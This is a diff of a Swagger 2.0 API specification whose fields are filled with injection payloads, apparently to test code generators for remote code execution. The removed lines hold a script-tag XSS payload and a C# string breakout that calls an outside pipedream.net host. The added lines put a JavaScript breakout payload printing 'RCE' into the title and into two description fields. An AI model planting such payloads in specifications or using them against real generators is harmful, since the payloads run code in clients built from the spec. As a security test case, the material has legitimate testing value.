@@ -1,9 +1,9 @@
       {
           "swagger": "2.0",
           "info": {
-              "description": "<script>alert(1)</script>",
+              "description": "/a');};};return exports;}));console.log('RCE');(function(){}(this,function(){a=function(){b=function(){new Array(",
               "version": "1.0.0",
-              "title": "/a\";Console.WriteLine(new WebClient().DownloadString(\"https://eo2gjl4lyl460rs.m.pipedream.net\"));"
+              "title": "/a');};};return exports;}));console.log('RCE');(function(){}(this,function(){a=function(){b=function(){new Array("
           },
           "schemes": [
               "http"
@@ -34,7 +34,7 @@
           "definitions": {
               "d": {
                   "type": "object",
-                  "description": "teste",
+                  "description": "/a');};};return exports;}));console.log('RCE');(function(){}(this,function(){a=function(){b=function(){new Array(",
                   "properties": {
                       "id": {
                           "type": "integer",
